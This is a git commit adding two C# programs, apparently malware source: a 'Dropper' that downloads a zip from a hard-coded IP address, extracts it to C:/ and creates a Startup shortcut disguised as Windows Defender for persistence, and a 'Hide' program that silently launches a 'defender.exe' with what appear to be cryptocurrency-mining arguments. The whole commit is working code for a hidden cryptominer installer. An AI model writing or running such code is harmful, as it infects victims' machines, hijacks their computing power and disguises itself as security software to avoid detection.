2f8da9ba1cdce59e539e65438b37f6bf19ef2ed2
Dylan Moore <hosnappp@gmail.com>
2017-04-28 00:35:56 -0400

    Initial upload

---
+++ Dropper/Dropper/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Net;
+using System.IO.Compression;
+using System.Runtime.InteropServices;
+namespace Dropper
+{
+    class Hello
+    {
+        static void Main()
+        {
+
+            using (var client = new WebClient())
+            {
+                client.DownloadFile("http://37.139.28.209/hi.zip", "hi.zip");
+            }
+            string user = Environment.UserName;
+            string dir_ = "C:/Users/";
+            string dir__ = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
+            string f = dir_ + user + dir__;
+            string lnk_ = "Defender.lnk";
+            string s = f + lnk_;
+            ZipFile.ExtractToDirectory("hi.zip", "C:/");
+            System.IO.File.Delete("hi.zip");
+            Type t = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
+            dynamic shell = Activator.CreateInstance(t);
+            try
+            {
+                var lnk = shell.CreateShortcut(s);
+                try
+                {
+                    lnk.TargetPath = @"C:\WindowsDefender\run.exe";
+                    lnk.IconLocation = "shell32.dll, 1";
+                    lnk.Save();
+                }
+                finally
+                {
+                    Marshal.FinalReleaseComObject(lnk);
+                }
+            }
+            finally
+            {
+                Marshal.FinalReleaseComObject(shell);
+            }
+        }
+    }
+}
---
+++ Hide/Hide/Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+
+namespace Hide
+{
+    static class Program
+    {
+        static void Main()
+        {
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.FileName = "C:/WindowsDefender/defender.exe";
+            startInfo.Arguments = "-user dylan@thisiswhereidostuff.com -bcn 2 -xmr 2";
+            startInfo.RedirectStandardOutput = true;
+            startInfo.RedirectStandardError = true;
+            startInfo.UseShellExecute = false;
+            startInfo.CreateNoWindow = true;
+
+            System.Diagnostics.Process processTemp = new System.Diagnostics.Process();
+            processTemp.StartInfo = startInfo;
+            processTemp.EnableRaisingEvents = true;
+            try
+            {
+                processTemp.Start();
+            }
+            catch (Exception e)
+            {
+                throw;
+            }
+        }
+    }
+}
